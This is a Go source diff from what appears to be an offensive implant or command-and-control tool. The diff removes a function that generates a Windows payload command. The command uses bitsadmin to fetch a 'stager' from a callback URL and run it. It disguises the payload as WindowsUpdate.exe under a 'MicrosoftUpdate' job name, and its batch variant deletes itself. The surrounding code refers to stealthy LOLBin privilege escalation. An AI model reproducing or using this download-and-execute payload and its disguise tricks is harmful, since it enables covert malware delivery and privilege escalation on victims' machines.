@@ -21,34 +21,6 @@ func escapeWindowsCommand(cmd string) string {
 	return cmd
 }
 
-// generateSimplePayload generates a simple payload command that downloads and executes
-// This avoids complex nesting that breaks quote handling
-func generateSimplePayload(callbackURL string) string {
-	// Use a simpler approach: create a batch file, download to it, execute it
-	// This avoids quote nesting issues
-	batchFile := `%TEMP%\WindowsUpdate.bat`
-	exeFile := `%TEMP%\WindowsUpdate.exe`
-	
-	// Create batch file that downloads and executes
-	batchContent := fmt.Sprintf(`@echo off
-bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s" >nul 2>&1
-if exist "%s" (
-    start /b "" "%s"
-    timeout /t 1 /nobreak >nul 2>&1
-    del "%s" >nul 2>&1
-)
-del "%%~f0" >nul 2>&1`, callbackURL, exeFile, exeFile, exeFile, exeFile)
-	
-	// Write batch file using echo commands (no file creation needed for cmd.exe)
-	// Actually, we need to use a different approach - cmd.exe can't easily create multi-line files
-	// Better: use a single-line command with proper escaping
-	
-	// Alternative: Use certutil to download to a .bat file, then execute
-	// Or: Use a simpler single-line approach
-	
-	// Simplest: Download directly and execute in one command
-	return fmt.Sprintf(`bitsadmin /transfer "MicrosoftUpdate" /download /priority normal "%s/stager" "%s" && start /b "" "%s"`, callbackURL, exeFile, exeFile)
-}
 
 // LOLBinEscalation provides stealthy privilege escalation using only LOLBins
 type LOLBinEscalation struct{}
